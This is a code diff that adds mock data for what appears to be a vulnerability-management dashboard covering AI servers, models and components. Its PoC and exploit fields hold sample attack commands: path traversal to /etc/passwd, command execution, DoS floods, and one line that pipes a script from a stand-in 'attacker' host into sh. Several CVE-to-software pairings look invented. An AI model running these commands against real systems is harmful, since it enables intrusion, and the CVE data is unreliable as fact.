+      'sys-1': { id:'sys-1', type:'system', label:'AI-GPU-Node',    sublabel:'10.10.24.101', risk:'critical', riskLabel:'严重', hostname:'gpu-node-01.ai.internal',    ip:'10.10.24.101', net:'内网', ips:[{ip:'10.10.24.101',net:'内网',primary:true},{ip:'10.10.24.102',net:'内网'},{ip:'172.16.12.18',net:'内网'}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'Ubuntu', distroVersion:'22.04 LTS', kernelVersion:'5.15.0-76-generic', virtSys:'KVM', virtRole:'Guest', uptime:'128天 14小时', processCount:342, assets:18, components:1246, vulns:87 },
+      'sys-2': { id:'sys-2', type:'system', label:'AI-Inference',   sublabel:'10.23.54.162', risk:'critical', riskLabel:'严重', hostname:'inference-02.ai.internal',   ip:'10.23.54.162', net:'内网', ips:[{ip:'10.23.54.162',net:'内网',primary:true},{ip:'10.23.54.163',net:'内网'}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'CentOS', distroVersion:'7.9.2009', kernelVersion:'3.10.0-1160', virtSys:'VMware', virtRole:'Guest', uptime:'45天 8小时', processCount:215, assets:6,  components:523,  vulns:31 },
+      'sys-3': { id:'sys-3', type:'system', label:'Data-Process',   sublabel:'162.125.1.50', risk:'low',      riskLabel:'低危', hostname:'data-proc-03.internal',      ip:'162.125.1.50', net:'内网', ips:[{ip:'162.125.1.50',net:'内网',primary:true},{ip:'10.1.8.20',net:'内网'}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'Debian', distroVersion:'11.6', kernelVersion:'5.10.0-21', virtSys:'KVM', virtRole:'Guest', uptime:'90天 2小时', processCount:188, assets:8,  components:412,  vulns:14 },
+      'sys-4': { id:'sys-4', type:'system', label:'Edge-Deploy',    sublabel:'200.0.113.45', risk:'medium',   riskLabel:'中危', hostname:'edge-04.external',           ip:'200.0.113.45', net:'外网', ips:[{ip:'200.0.113.45',net:'外网',primary:true},{ip:'10.88.0.6',net:'内网'}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'Ubuntu', distroVersion:'20.04 LTS', kernelVersion:'5.4.0-150', virtSys:'Physical', virtRole:'Host', uptime:'300天 10小时', processCount:420, assets:3,  components:198,  vulns:22 },
+      'sys-5': { id:'sys-5', type:'system', label:'MLOps-Platform', sublabel:'10.36.28.18',  risk:'high',     riskLabel:'高危', hostname:'mlops-05.ai.internal',       ip:'10.36.28.18',  net:'内网', ips:[{ip:'10.36.28.18',net:'内网',primary:true},{ip:'10.36.28.19',net:'内网'}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'Ubuntu', distroVersion:'22.04 LTS', kernelVersion:'5.15.0-76', virtSys:'KVM', virtRole:'Guest', uptime:'60天 5小时', processCount:512, assets:12, components:876,  vulns:54 },
+      'sys-6': { id:'sys-6', type:'system', label:'Model-Registry', sublabel:'10.16.25.11',  risk:'medium',   riskLabel:'中危', hostname:'registry-06.ai.internal',    ip:'10.16.25.11',  net:'内网', ips:[{ip:'10.16.25.11',net:'内网',primary:true},{ip:'10.16.25.12',net:'内网'}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'CentOS', distroVersion:'8.4.2105', kernelVersion:'4.18.0-305', virtSys:'VMware', virtRole:'Guest', uptime:'150天 12小时', processCount:275, assets:5,  components:342,  vulns:19 },
+      'sys-7': { id:'sys-7', type:'system', label:'Security-Audit', sublabel:'10.23.1.100',  risk:'low',      riskLabel:'低危', hostname:'audit-07.sec.internal',      ip:'10.23.1.100',  net:'内网', ips:[{ip:'10.23.1.100',net:'内网',primary:true}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'Debian', distroVersion:'12.0', kernelVersion:'6.1.0-9', virtSys:'KVM', virtRole:'Guest', uptime:'20天 1小时', processCount:150, assets:4,  components:231,  vulns:7  },
+      'sys-8': { id:'sys-8', type:'system', label:'Cloud-Gateway',  sublabel:'200.5.3.20',   risk:'critical', riskLabel:'严重', hostname:'gw-08.cloud.external',       ip:'200.5.3.20',   net:'外网', ips:[{ip:'200.5.3.20',net:'外网',primary:true},{ip:'10.9.0.2',net:'内网'}], os:'Linux', osVersion:'14.0.0', cpuArch:'amd64', distro:'Ubuntu', distroVersion:'22.04 LTS', kernelVersion:'5.15.0-76', virtSys:'AWS EC2', virtRole:'Guest', uptime:'180天 22小时', processCount:380, assets:9,  components:654,  vulns:62 },
+      // Containers
+      'ctn-1': { id:'ctn-1', type:'container', label:'k8s-llm-pod',     sublabel:'k8s/prod',     risk:'high',   riskLabel:'高危', system:'sys-1', imgTag:'v1.0.0', imgTags:['v1.0.0','latest'], imgSize:'2.4 GB', created:'2024-03-15 10:20:30', os:'Alpine Linux', cpuArch:'amd64', distro:'Alpine', distroVersion:'3.18.4', assets:3, components:186, vulns:15 },
+      'ctn-2': { id:'ctn-2', type:'container', label:'docker-training',  sublabel:'training/env', risk:'low',    riskLabel:'低危', system:'sys-1', imgTag:'latest', imgTags:['latest','v1.2.0','v1.1.0'], imgSize:'4.1 GB', created:'2024-02-28 14:15:00', os:'Ubuntu', cpuArch:'amd64', distro:'Ubuntu', distroVersion:'22.04 LTS', assets:2, components:152, vulns:9  },
+      'ctn-3': { id:'ctn-3', type:'container', label:'k8s-pipeline-pod', sublabel:'k8s/mlops',    risk:'medium', riskLabel:'中危', system:'sys-5', imgTag:'v2.1.0', imgTags:['v2.1.0'], imgSize:'1.8 GB', created:'2024-03-10 09:45:12', os:'Debian', cpuArch:'amd64', distro:'Debian', distroVersion:'11.6', assets:4, components:204, vulns:18 },
+      'ctn-4': { id:'ctn-4', type:'container', label:'docker-serving',   sublabel:'serving/v2',   risk:'high',   riskLabel:'高危', system:'sys-8', imgTag:'stable', imgTags:['stable','v3.0.0-rc1'], imgSize:'3.2 GB', created:'2024-03-01 16:30:45', os:'CentOS', cpuArch:'amd64', distro:'CentOS', distroVersion:'7.9.2009', assets:3, components:168, vulns:24 },
+      // Apps
+      'app-1': { id:'app-1', type:'app', label:'llm-inference',      sublabel:'v2.4.1', risk:'high',     riskLabel:'高危', system:'sys-1', container:'ctn-1', appPath:'/opt/app/inference', assets:5, components:342, vulns:28 },
+      'app-2': { id:'app-2', type:'app', label:'model-training',     sublabel:'v1.8.0', risk:'medium',   riskLabel:'中危', system:'sys-1', container:'ctn-2', appPath:'/opt/app/training', assets:3, components:418, vulns:22 },
+      'app-3': { id:'app-3', type:'app', label:'nlp-api-gateway',    sublabel:'v3.2.0', risk:'low',      riskLabel:'低危', system:'sys-2', appPath:'/usr/local/bin/gateway', assets:2, components:156, vulns:8  },
+      'app-4': { id:'app-4', type:'app', label:'data-etl-engine',    sublabel:'v5.1.2', risk:'low',      riskLabel:'低危', system:'sys-3', appPath:'/opt/etl', assets:2, components:287, vulns:6  },
+      'app-5': { id:'app-5', type:'app', label:'feature-store-api',  sublabel:'v1.3.0', risk:'medium',   riskLabel:'中危', system:'sys-5', container:'ctn-3', appPath:'/opt/feature-store', assets:3, components:198, vulns:11 },
+      'app-6': { id:'app-6', type:'app', label:'model-eval-service', sublabel:'v2.1.0', risk:'high',     riskLabel:'高危', system:'sys-5', appPath:'/opt/eval-service', assets:2, components:224, vulns:19 },
+      'app-7': { id:'app-7', type:'app', label:'registry-api',       sublabel:'v4.0.2', risk:'medium',   riskLabel:'中危', system:'sys-6', appPath:'/var/www/registry', assets:2, components:176, vulns:13 },
+      'app-8': { id:'app-8', type:'app', label:'cloud-proxy',        sublabel:'v1.9.5', risk:'critical', riskLabel:'严重', system:'sys-8', container:'ctn-4', appPath:'/opt/proxy', assets:4, components:312, vulns:38 },
+      'app-9': { id:'app-9', type:'app', label:'gpu-scheduler',      sublabel:'v1.2.0', risk:'medium',   riskLabel:'中危', system:'sys-1', appPath:'/usr/local/scheduler', assets:2, components:96,  vulns:6  },
+      'app-10': { id:'app-10', type:'app', label:'embedding-service', sublabel:'v0.9.3', risk:'low',      riskLabel:'低危', system:'sys-1', appPath:'/opt/embedding', assets:2, components:84,  vulns:3  },
+      // Models
+      'model-1': { id:'model-1', type:'model', label:'Qwen2-72B',        sublabel:'SafeTensors', risk:'medium', riskLabel:'中危', system:'sys-1', app:'app-1', components:24, vulns:5, modelPath:'/opt/models/qwen2-72b', modelSize:'144 GB', modelType:'LLM', modelArch:'Transformer', params:'72B' },
+      'model-2': { id:'model-2', type:'model', label:'ChatGLM3-6B',      sublabel:'PyTorch',     risk:'medium', riskLabel:'中危', system:'sys-1', app:'app-2', components:18, vulns:8, modelPath:'/opt/models/chatglm3-6b', modelSize:'12 GB', modelType:'LLM', modelArch:'Transformer', params:'6B' },
+      'model-3': { id:'model-3', type:'model', label:'BERT-Base-CN',     sublabel:'SafeTensors', risk:'low',    riskLabel:'低危', system:'sys-2', app:'app-3', components:12, vulns:2, modelPath:'/opt/models/bert-base-cn', modelSize:'420 MB', modelType:'NLP', modelArch:'Transformer', params:'110M' },
+      'model-4': { id:'model-4', type:'model', label:'Stable-Diff-XL',   sublabel:'SafeTensors', risk:'high',   riskLabel:'高危', system:'sys-5', app:'app-6', components:31, vulns:12, modelPath:'/opt/models/sdxl', modelSize:'6.5 GB', modelType:'CV', modelArch:'Diffusion', params:'3.5B' },
+      'model-5': { id:'model-5', type:'model', label:'Whisper-Large-v3', sublabel:'PyTorch',     risk:'low',    riskLabel:'低危', system:'sys-6', app:'app-7', components:16, vulns:3, modelPath:'/opt/models/whisper-l-v3', modelSize:'3.1 GB', modelType:'Audio', modelArch:'Transformer', params:'1550M' },
+      'model-6': { id:'model-6', type:'model', label:'Mixtral-8x7B',     sublabel:'SafeTensors', risk:'medium', riskLabel:'中危', system:'sys-1', app:'app-9', components:14, vulns:2, modelPath:'/opt/models/mixtral-8x7b', modelSize:'87 GB', modelType:'LLM', modelArch:'MoE', params:'46.7B' },
+      'model-7': { id:'model-7', type:'model', label:'InternLM2-7B',     sublabel:'PyTorch',     risk:'low',    riskLabel:'低危', system:'sys-1', app:'app-9', components:11, vulns:1, modelPath:'/opt/models/internlm2-7b', modelSize:'14.5 GB', modelType:'LLM', modelArch:'Transformer', params:'7B' },
+      'model-8': { id:'model-8', type:'model', label:'BGE-Large-ZH',     sublabel:'SafeTensors', risk:'low',    riskLabel:'低危', system:'sys-1', app:'app-10', components:9,  vulns:0, modelPath:'/opt/models/bge-large-zh', modelSize:'1.3 GB', modelType:'Embedding', modelArch:'Transformer', params:'326M' },
+      'model-9': { id:'model-9', type:'model', label:'E5-Large',         sublabel:'SafeTensors', risk:'medium', riskLabel:'中危', system:'sys-1', app:'app-10', components:10, vulns:1, modelPath:'/opt/models/e5-large', modelSize:'1.3 GB', modelType:'Embedding', modelArch:'Transformer', params:'335M' },
+      // Components
+      'comp-pytorch':      { id:'comp-pytorch',      type:'component', label:'pytorch',       sublabel:'2.1.2',   risk:'high',   riskLabel:'高危', vulns:5, isAI:true,  ctype:'库', language:'Python', vendor:'Meta', purl:'pkg:pypi/pytorch@2.1.2', ref:'https://pytorch.org/', license:'BSD-3-Clause', licenses:['BSD-3-Clause','Apache-2.0'], homepage:'https://pytorch.org', deps:['comp-numpy'] },
+      'comp-transformers': { id:'comp-transformers', type:'component', label:'transformers',  sublabel:'4.36.2',  risk:'medium', riskLabel:'中危', vulns:3, isAI:true,  ctype:'库', language:'Python', vendor:'Hugging Face', purl:'pkg:pypi/transformers@4.36.2', ref:'https://huggingface.co/docs/transformers', license:'Apache-2.0', licenses:['Apache-2.0'], homepage:'https://huggingface.co/docs/transformers', desc:'用于自然语言处理的预训练模型库', deps:['comp-numpy','comp-safetensors'] },
+      'comp-numpy':        { id:'comp-numpy',        type:'component', label:'numpy',         sublabel:'1.24.4',  risk:'medium', riskLabel:'中危', vulns:2, isAI:false, ctype:'库', language:'C/Python', vendor:'NumPy Developers', purl:'pkg:pypi/numpy@1.24.4', ref:'https://numpy.org/doc/', license:'BSD-3-Clause', licenses:['BSD-3-Clause'], homepage:'https://numpy.org', desc:'科学计算基础库', deps:[] },
+      'comp-fastapi':      { id:'comp-fastapi',      type:'component', label:'fastapi',       sublabel:'0.109.0', risk:'medium', riskLabel:'中危', vulns:4, isAI:false, ctype:'框架', language:'Python', vendor:'Sebastián Ramírez', purl:'pkg:pypi/fastapi@0.109.0', ref:'https://fastapi.tiangolo.com/', license:'MIT', licenses:['MIT'], homepage:'https://fastapi.tiangolo.com', desc:'高性能 Web API 框架', deps:['comp-numpy'] },
+      'comp-diffusers':    { id:'comp-diffusers',    type:'component', label:'diffusers',     sublabel:'0.25.0',  risk:'high',   riskLabel:'高危', vulns:6, isAI:true,  ctype:'库', language:'Python', vendor:'Hugging Face', purl:'pkg:pypi/diffusers@0.25.0', ref:'https://huggingface.co/docs/diffusers', license:'Apache-2.0', licenses:['Apache-2.0'], homepage:'https://huggingface.co/docs/diffusers', desc:'扩散模型推理/训练库', deps:['comp-transformers','comp-safetensors','comp-numpy'] },
+      'comp-safetensors':  { id:'comp-safetensors',  type:'component', label:'safetensors',   sublabel:'0.4.2',   risk:'low',    riskLabel:'低危', vulns:1, isAI:true,  ctype:'库', language:'Rust/Python', vendor:'Hugging Face', purl:'pkg:pypi/safetensors@0.4.2', ref:'https://huggingface.co/docs/safetensors', license:'Apache-2.0', licenses:['Apache-2.0'], homepage:'https://huggingface.co/docs/safetensors', desc:'安全的张量存储格式', deps:['comp-numpy'] },
+      'comp-onnxruntime':  { id:'comp-onnxruntime',  type:'component', label:'onnxruntime',   sublabel:'1.17.0',  risk:'medium', riskLabel:'中危', vulns:3, isAI:true,  ctype:'运行时', language:'C++', vendor:'Microsoft', purl:'pkg:github/microsoft/onnxruntime@1.17.0', ref:'https://onnxruntime.ai/docs/', license:'MIT', licenses:['MIT','Apache-2.0'], homepage:'https://onnxruntime.ai', desc:'ONNX 模型推理运行时', deps:['comp-numpy'] },
+      'comp-triton':       { id:'comp-triton',       type:'component', label:'triton-server', sublabel:'2.4.0',   risk:'high',   riskLabel:'高危', vulns:7, isAI:false, ctype:'服务', language:'C++/Python', vendor:'NVIDIA', purl:'pkg:docker/triton-inference-server@2.4.0', ref:'https://developer.nvidia.com/nvidia-triton-inference-server', license:'BSD-3-Clause', licenses:['BSD-3-Clause'], homepage:'https://developer.nvidia.com/nvidia-triton-inference-server', desc:'NVIDIA 推理服务', deps:[] },
+      // Vulnerabilities
+      'vuln-1': { id:'vuln-1', type:'vuln', vulnLevel:'critical', label:'CVE-2024-31583', sublabel:'CVSS 9.8', risk:'critical', riskLabel:'严重', name:'pytorch 反序列化远程代码执行漏洞', cnvd:'CNVD-2024-031583', cnnvd:'CNNVD-202402-31583', publishDate:'2024-02-12', cvss:9.8, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', riskScore:97, epss:0.962, cwe:'CWE-502', harm:'远程代码执行', link:'https://nvd.nist.gov/vuln/detail/CVE-2024-31583', scope:'影响使用受影响版本 pytorch 的推理/训练服务', solution:'升级至官方修复版本或禁用不可信输入反序列化路径', detail:'攻击者可通过构造恶意输入触发反序列化链，导致远程代码执行。' },
+      'vuln-2': { id:'vuln-2', type:'vuln', vulnLevel:'high',     label:'CVE-2024-27318', sublabel:'CVSS 8.6', risk:'high',     riskLabel:'高危', name:'pytorch 张量解析越界读漏洞', cnvd:'CNVD-2024-027318', cnnvd:'CNNVD-202401-27318', publishDate:'2024-01-29', cvss:8.6, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', riskScore:86, epss:0.731, cwe:'CWE-125', harm:'信息泄露', link:'https://nvd.nist.gov/vuln/detail/CVE-2024-27318', scope:'影响暴露模型推理接口的服务', solution:'升级组件版本并开启输入校验', detail:'特定输入可导致越界读取，造成信息泄露风险。' },
+      'vuln-3': { id:'vuln-3', type:'vuln', vulnLevel:'medium',   label:'CVE-2023-45802', sublabel:'CVSS 5.3', risk:'medium',   riskLabel:'中危', name:'transformers 解析错误导致拒绝服务', cnvd:'CNVD-2023-045802', cnnvd:'CNNVD-202311-45802', publishDate:'2023-11-21', cvss:5.3, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', riskScore:61, epss:0.214, cwe:'CWE-20', harm:'拒绝服务', link:'https://nvd.nist.gov/vuln/detail/CVE-2023-45802', scope:'影响模型加载与推理流程', solution:'升级 transformers 并限制请求体大小', detail:'异常输入可触发高 CPU/内存占用导致服务不可用。' },
+      'vuln-4': { id:'vuln-4', type:'vuln', vulnLevel:'low',      label:'CVE-2023-38325', sublabel:'CVSS 3.1', risk:'low',      riskLabel:'低危', name:'fastapi 文档端点信息泄露', cnvd:'CNVD-2023-038325', cnnvd:'CNNVD-202310-38325', publishDate:'2023-10-08', cvss:3.1, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N', riskScore:33, epss:0.051, cwe:'CWE-200', harm:'信息泄露', link:'https://nvd.nist.gov/vuln/detail/CVE-2023-38325', scope:'影响启用公开文档的 API 服务', solution:'关闭公开文档或加鉴权控制', detail:'未授权访问可能暴露接口定义与部分配置信息。' },
+      'vuln-5': { id:'vuln-5', type:'vuln', vulnLevel:'critical', label:'CVE-2024-21762', sublabel:'CVSS 9.8', risk:'critical', riskLabel:'严重', name:'triton-server 未授权访问远程执行漏洞', cnvd:'CNVD-2024-021762', cnnvd:'CNNVD-202402-21762', publishDate:'2024-02-09', cvss:9.8, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', riskScore:96, epss:0.973, cwe:'CWE-306', harm:'未授权访问/远程执行', link:'https://nvd.nist.gov/vuln/detail/CVE-2024-21762', scope:'影响暴露 triton 推理管理接口的系统', solution:'限制网络访问并升级至修复版本', detail:'缺少鉴权控制可能导致未授权执行敏感操作。' },
+      'vuln-6': { id:'vuln-6', type:'vuln', vulnLevel:'high',     label:'CVE-2024-25600', sublabel:'CVSS 8.2', risk:'high',     riskLabel:'高危', name:'diffusers 模型文件解析命令注入', cnvd:'CNVD-2024-025600', cnnvd:'CNNVD-202402-25600', publishDate:'2024-02-20', cvss:8.2, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', riskScore:84, epss:0.643, cwe:'CWE-77', harm:'命令执行', link:'https://nvd.nist.gov/vuln/detail/CVE-2024-25600', scope:'影响加载外部模型文件的服务', solution:'升级 diffusers 并禁用不可信模型来源', detail:'恶意模型元数据可能触发命令注入，执行任意命令。' },
+      'vuln-7': { id:'vuln-7', type:'vuln', vulnLevel:'medium',   label:'CVE-2024-29415', sublabel:'CVSS 6.1', risk:'medium',   riskLabel:'中危', name:'onnxruntime 内存管理缺陷导致崩溃', cnvd:'CNVD-2024-029415', cnnvd:'CNNVD-202403-29415', publishDate:'2024-03-14', cvss:6.1, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H', riskScore:58, epss:0.298, cwe:'CWE-416', harm:'拒绝服务/崩溃', link:'https://nvd.nist.gov/vuln/detail/CVE-2024-29415', scope:'影响使用 onnxruntime 的推理服务', solution:'升级至修复版本并启用沙箱运行', detail:'特定输入可触发内存错误导致服务崩溃。' },
+      'vuln-8': { id:'vuln-8', type:'vuln', vulnLevel:'high',     label:'CVE-2024-34069', sublabel:'CVSS 7.5', risk:'high',     riskLabel:'高危', name:'diffusers 依赖组件路径穿越漏洞', cnvd:'CNVD-2024-034069', cnnvd:'CNNVD-202404-34069', publishDate:'2024-04-08', cvss:7.5, vector:'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', riskScore:73, epss:0.412, cwe:'CWE-22', harm:'敏感信息泄露', link:'https://nvd.nist.gov/vuln/detail/CVE-2024-34069', scope:'影响处理外部输入路径的服务', solution:'升级组件并进行路径归一化校验', detail:'攻击者可能通过路径穿越读取敏感文件。' },
+
+      'poc-1': { id:'poc-1', type:'poc', label:'POC-31583-01', sublabel:'HTTP 验证', vuln:'vuln-1', name:'反序列化验证 POC', engine:'PoC Script', language:'Python', ref:'https://github.com/your-org/poc-31583', method:'HTTP 请求', content:`POST /infer HTTP/1.1\nHost: target\nContent-Type: application/json\n\n{\"payload\":\"<malformed>\"}` },
+      'exp-1': { id:'exp-1', type:'exp', label:'EXP-31583-01', sublabel:'利用脚本', vuln:'vuln-1', name:'RCE 利用 EXP', engine:'Metasploit', language:'Ruby', ref:'https://example.com/exp/31583', link:'https://example.com/exp/31583', scenario:'对外暴露推理接口且未做输入校验', content:`python3 exp.py --url http://target/infer --cmd id\npython3 exp.py --url http://target/infer --cmd \"cat /etc/passwd\"` },
+
+      'poc-2': { id:'poc-2', type:'poc', label:'POC-27318-01', sublabel:'接口验证', vuln:'vuln-2', name:'越界读验证 POC', engine:'PoC Script', language:'Shell', ref:'https://example.com/poc/27318', method:'HTTP 请求', content:`curl -X POST http://target/api -d @payload.bin` },
+      'exp-2': { id:'exp-2', type:'exp', label:'EXP-27318-01', sublabel:'信息泄露', vuln:'vuln-2', name:'信息泄露 EXP', engine:'Exploit Script', language:'Python', ref:'https://example.com/exp/27318', link:'https://example.com/exp/27318', scenario:'可枚举推理返回数据且未做脱敏', content:`python3 leak.py --url http://target/api --count 100` },
+
+      'poc-3': { id:'poc-3', type:'poc', label:'POC-45802-01', sublabel:'DoS 验证', vuln:'vuln-3', name:'拒绝服务验证 POC', engine:'PoC Script', language:'Shell', ref:'https://example.com/poc/45802', method:'HTTP 请求', content:`curl -X POST http://target/infer -H "Content-Type: application/json" -d "{\"text\":\"$(python3 - <<'PY'\nprint('A'*500000)\nPY)\"}"` },
+      'exp-3': { id:'exp-3', type:'exp', label:'EXP-45802-01', sublabel:'DoS 场景', vuln:'vuln-3', name:'资源耗尽 EXP', engine:'Exploit Tool', language:'Shell', ref:'https://example.com/exp/45802', link:'https://example.com/exp/45802', scenario:'请求未限流且未限制 payload 大小', content:`ab -n 2000 -c 50 -p big.json -T application/json http://target/infer` },
+
+      'poc-4': { id:'poc-4', type:'poc', label:'POC-38325-01', sublabel:'浏览器验证', vuln:'vuln-4', name:'文档泄露验证 POC', engine:'Manual', language:'Browser', ref:'https://example.com/poc/38325', method:'浏览器访问', content:`GET /docs\nGET /openapi.json` },
+      'exp-4': { id:'exp-4', type:'exp', label:'EXP-38325-01', sublabel:'信息收集', vuln:'vuln-4', name:'接口信息收集 EXP', engine:'Exploit Script', language:'Python', ref:'https://example.com/exp/38325', link:'https://example.com/exp/38325', scenario:'文档公开且未加鉴权', content:`python3 enum_api.py --openapi http://target/openapi.json` },
+
+      'poc-5': { id:'poc-5', type:'poc', label:'POC-21762-01', sublabel:'鉴权验证', vuln:'vuln-5', name:'未授权访问验证 POC', engine:'PoC Script', language:'Shell', ref:'https://example.com/poc/21762', method:'HTTP 请求', content:`curl http://target:8000/v2/health/ready\ncurl http://target:8000/v2/models` },
+      'exp-5': { id:'exp-5', type:'exp', label:'EXP-21762-01', sublabel:'远程执行', vuln:'vuln-5', name:'管理接口利用 EXP', engine:'Exploit Script', language:'Python', ref:'https://example.com/exp/21762', link:'https://example.com/exp/21762', scenario:'管理接口对公网开放且未做鉴权', content:`python3 triton_exp.py --url http://target:8000 --action exec --cmd id` },
+
+      'poc-6': { id:'poc-6', type:'poc', label:'POC-25600-01', sublabel:'文件验证', vuln:'vuln-6', name:'命令注入验证 POC', engine:'PoC Script', language:'Python', ref:'https://example.com/poc/25600', method:'加载模型文件', content:`python3 poc.py --model malicious.safetensors --url http://target/upload` },
+      'exp-6': { id:'exp-6', type:'exp', label:'EXP-25600-01', sublabel:'命令执行', vuln:'vuln-6', name:'命令注入 EXP', engine:'Exploit Script', language:'Python', ref:'https://example.com/exp/25600', link:'https://example.com/exp/25600', scenario:'支持上传/加载外部模型且缺少校验', content:`python3 exp.py --url http://target/upload --cmd "curl http://attacker/payload.sh | sh"` },
+
+      'poc-7': { id:'poc-7', type:'poc', label:'POC-29415-01', sublabel:'崩溃验证', vuln:'vuln-7', name:'崩溃验证 POC', engine:'PoC Script', language:'Python', ref:'https://example.com/poc/29415', method:'提交畸形输入', content:`python3 fuzz.py --url http://target/onnx --case crash1` },
+      'exp-7': { id:'exp-7', type:'exp', label:'EXP-29415-01', sublabel:'拒绝服务', vuln:'vuln-7', name:'拒绝服务 EXP', engine:'Exploit Script', language:'Python', ref:'https://example.com/exp/29415', link:'https://example.com/exp/29415', scenario:'对外提供推理接口且无隔离', content:`python3 dos.py --url http://target/onnx --threads 20` },
+
+      'poc-8': { id:'poc-8', type:'poc', label:'POC-34069-01', sublabel:'路径验证', vuln:'vuln-8', name:'路径穿越验证 POC', engine:'PoC Script', language:'Shell', ref:'https://example.com/poc/34069', method:'构造路径输入', content:`curl -X POST http://target/api -d '{"path":"../../etc/passwd"}'` },
+      'exp-8': { id:'exp-8', type:'exp', label:'EXP-34069-01', sublabel:'文件读取', vuln:'vuln-8', name:'敏感文件读取 EXP', engine:'Exploit Script', language:'Python', ref:'https://example.com/exp/34069', link:'https://example.com/exp/34069', scenario:'路径参数未做归一化且可读任意路径', content:`python3 read.py --url http://target/api --path ../../etc/passwd` }
+    },
+    edges: [
+      { from:'sys-1', to:'ctn-1', rel:'contain' }, { from:'sys-1', to:'ctn-2', rel:'contain' },
+      { from:'sys-1', to:'app-9', rel:'contain' }, { from:'sys-1', to:'app-10', rel:'contain' },
+      { from:'ctn-1', to:'app-1', rel:'contain' }, { from:'ctn-2', to:'app-2', rel:'contain' },
+      { from:'app-1', to:'model-1', rel:'contain' }, { from:'app-2', to:'model-2', rel:'contain' },
+      { from:'app-9', to:'model-6', rel:'contain' }, { from:'app-9', to:'model-7', rel:'contain' },
+      { from:'app-10', to:'model-8', rel:'contain' }, { from:'app-10', to:'model-9', rel:'contain' },
+      { from:'sys-1', to:'comp-pytorch', rel:'exist' }, { from:'sys-1', to:'comp-fastapi', rel:'exist' },
+      { from:'app-1', to:'comp-pytorch', rel:'depend' }, { from:'app-1', to:'comp-fastapi', rel:'depend' },
+      { from:'app-1', to:'comp-numpy', rel:'depend' }, { from:'model-1', to:'comp-transformers', rel:'contain' },
+      { from:'model-1', to:'comp-safetensors', rel:'contain' },
+      { from:'sys-2', to:'app-3', rel:'contain' }, { from:'app-3', to:'model-3', rel:'contain' },
+      { from:'app-3', to:'comp-onnxruntime', rel:'depend' },
+      { from:'sys-3', to:'app-4', rel:'contain' }, { from:'app-4', to:'comp-numpy', rel:'depend' },
+      { from:'sys-4', to:'ctn-4', rel:'contain' }, { from:'ctn-4', to:'app-8', rel:'contain' },
+      { from:'app-8', to:'comp-triton', rel:'depend' },
+      { from:'sys-5', to:'ctn-3', rel:'contain' },
+      { from:'ctn-3', to:'app-5', rel:'contain' }, { from:'ctn-3', to:'app-6', rel:'contain' },
+      { from:'app-5', to:'comp-numpy', rel:'depend' }, { from:'app-6', to:'model-4', rel:'contain' },
+      { from:'model-4', to:'comp-diffusers', rel:'contain' }, { from:'model-4', to:'comp-safetensors', rel:'contain' }, { from:'app-6', to:'comp-safetensors', rel:'depend' },
+      { from:'sys-6', to:'app-7', rel:'contain' }, { from:'app-7', to:'model-5', rel:'contain' },
+      { from:'model-5', to:'comp-transformers', rel:'contain' }, { from:'app-1', to:'comp-safetensors', rel:'depend' },
+      { from:'sys-8', to:'ctn-4', rel:'contain' },
+      { from:'comp-pytorch',      to:'vuln-1', rel:'exist' }, { from:'comp-pytorch',     to:'vuln-2', rel:'exist' },
+      { from:'comp-transformers',  to:'vuln-3', rel:'exist' }, { from:'comp-fastapi',     to:'vuln-4', rel:'exist' },
+      { from:'comp-triton',        to:'vuln-5', rel:'exist' }, { from:'comp-diffusers',   to:'vuln-6', rel:'exist' },
+      { from:'comp-onnxruntime',   to:'vuln-7', rel:'exist' }, { from:'comp-diffusers',   to:'vuln-8', rel:'exist' }
+      ,{ from:'vuln-1', to:'poc-1', rel:'contain' }, { from:'vuln-1', to:'exp-1', rel:'contain' }
+      ,{ from:'vuln-2', to:'poc-2', rel:'contain' }, { from:'vuln-2', to:'exp-2', rel:'contain' }
+      ,{ from:'vuln-3', to:'poc-3', rel:'contain' }, { from:'vuln-3', to:'exp-3', rel:'contain' }
+      ,{ from:'vuln-4', to:'poc-4', rel:'contain' }, { from:'vuln-4', to:'exp-4', rel:'contain' }
+      ,{ from:'vuln-5', to:'poc-5', rel:'contain' }, { from:'vuln-5', to:'exp-5', rel:'contain' }
+      ,{ from:'vuln-6', to:'poc-6', rel:'contain' }, { from:'vuln-6', to:'exp-6', rel:'contain' }
+      ,{ from:'vuln-7', to:'poc-7', rel:'contain' }, { from:'vuln-7', to:'exp-7', rel:'contain' }
+      ,{ from:'vuln-8', to:'poc-8', rel:'contain' }, { from:'vuln-8', to:'exp-8', rel:'contain' }
+    ],
+    children: {
+      null: ['sys-1','sys-2','sys-3','sys-4','sys-5','sys-6','sys-7','sys-8'],
+      'sys-1': ['ctn-1','ctn-2','app-9','app-10'], 'sys-2': ['app-3'], 'sys-3': ['app-4'], 'sys-4': ['ctn-4'],
+      'sys-5': ['ctn-3'], 'sys-6': ['app-7'], 'sys-7': [], 'sys-8': ['ctn-4'],
+      'ctn-1': ['app-1'], 'ctn-2': ['app-2'], 'ctn-3': ['app-5','app-6'], 'ctn-4': ['app-8'],
+      'app-1': ['model-1','comp-pytorch','comp-fastapi','comp-numpy'], 'app-2': ['model-2'],
+      'app-3': ['model-3','comp-onnxruntime'], 'app-4': ['comp-numpy'],
+      'app-5': ['comp-numpy'], 'app-6': ['model-4'], 'app-7': ['model-5'], 'app-8': ['comp-triton'],
+      'app-9': ['model-6','model-7'], 'app-10': ['model-8','model-9'],
+      'model-1': ['comp-transformers','comp-safetensors'], 'model-2': [], 'model-3': [],
